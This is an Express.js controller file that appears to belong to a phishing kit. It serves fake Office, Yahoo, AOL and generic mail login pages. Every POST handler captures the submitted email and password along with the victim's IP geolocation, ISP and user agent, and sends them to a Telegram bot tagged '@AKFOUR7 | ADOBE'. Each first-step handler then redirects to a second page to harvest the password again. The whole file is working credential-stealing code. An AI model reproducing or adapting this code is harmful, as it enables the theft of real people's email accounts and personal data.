const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../../settings");
const getIPDetails = require("../middleware/getIPDetails");


exports.office = (req, res) => {
  const email = req.query.email;
  res.render("office/login3", { email });
};
exports.office2 = (req, res) => {
  const email = req.query.email;
  res.render("office/login4", { email });
};
exports.yahoo = (req, res) => {
  const email = req.query.email;
  res.render("yahoo/login3", { email });
};
exports.yahoo2 = (req, res) => {
  const email = req.query.email;
  res.render("yahoo/login4", { email });
};

exports.aol = (req, res) => {
  const email = req.query.email;
  res.render("aol/login3", { email });
};
exports.aol2 = (req, res) => {
  const email = req.query.email;
  res.render("aol/login4", { email });
};

exports.mail = (req, res) => {
  const email = req.query.email;
  res.render("login3", { email });
};
exports.mail2 = (req, res) => {
  const email = req.query.email;
  res.render("login4", { email });
};

exports.yahooPost = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect(`/auth/yahoo/2?email=${encodeURIComponent(email)}`);
};
exports.yahooPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect("/auth/complete");
};

exports.yahooPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email       : ${email}\n\n` +
    `🔑Password2 : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect("/auth/complete");
};

exports.officePost = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect(`/auth/office/2?email=${encodeURIComponent(email)}`);
};
exports.officePost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password2 : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect("/auth/complete");
};

exports.aolPost = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect(`/auth/aol/2?email=${encodeURIComponent(email)}`);
};

exports.aolPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password2 : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect("/auth/complete");
};

exports.mailPost = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect(`/auth/mail/2?email=${encodeURIComponent(email)}`);
};
exports.mailPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | ADOBE \n\n` +
    `📧Email : ${email}\n\n` +
    `🔑Password2 : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  // Redirect to a new page with the same query parameters
  res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
  return res.render("complete");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};

